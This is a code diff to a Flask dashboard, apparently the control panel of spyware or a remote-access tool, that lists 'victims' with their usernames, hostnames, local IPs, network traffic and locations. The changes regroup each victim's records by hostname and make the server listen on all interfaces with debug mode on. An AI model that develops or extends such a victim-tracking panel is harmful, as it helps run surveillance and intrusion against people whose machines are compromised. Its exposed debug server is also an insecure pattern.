@@ -121,10 +121,22 @@ def settings():
 def get_victims():
     conn = get_db_connection()
     cursor = conn.cursor(DictCursor)
-    cursor.execute("SELECT id, username, hostname, local_ip, created_at FROM system_info")
+
+    cursor.execute("""
+        SELECT t.*
+        FROM system_info t
+        INNER JOIN (
+            SELECT hostname, MAX(created_at) as max_time
+            FROM system_info
+            GROUP BY hostname
+        ) grouped
+        ON t.hostname = grouped.hostname AND t.created_at = grouped.max_time
+    """)
+    
     victims = cursor.fetchall()
     conn.close()
     return jsonify(victims)
+
 
 @app.route('/overview')
 def overview():
@@ -177,18 +189,30 @@ def history():
 @app.route('/network')
 def network():
     victim_id = request.args.get('id')
-    victim = get_victim(victim_id)
 
     conn = get_db_connection()
     cursor = conn.cursor(DictCursor)
-    cursor.execute("SELECT packets_sent, packets_recv, created_at FROM system_info WHERE id = %s", (victim_id,))
+
+    cursor.execute("SELECT * FROM system_info WHERE id = %s", (victim_id,))
+    victim = cursor.fetchone()
+
+    if not victim:
+        conn.close()
+        return "Victim not found", 404
+
+    hostname = victim['hostname']
+
+    cursor.execute("""
+        SELECT packets_sent, packets_recv, created_at
+        FROM system_info
+        WHERE hostname = %s
+        ORDER BY created_at
+    """, (hostname,))
     network_data = cursor.fetchall()
+
     conn.close()
-    
-    if victim and network_data:
-        return render_template('network.html', network_data=network_data, victim=victim)
-    else:
-        return "Network data not found", 404
+
+    return render_template('network.html', network_data=network_data, victim=victim)
 
 @app.route('/location')
 def location():
@@ -232,4 +256,4 @@ def logout():
     return redirect(url_for('login'))
 
 if __name__ == '__main__':
-    app.run(debug=True)
+    app.run(debug=True, host='0.0.0.0')
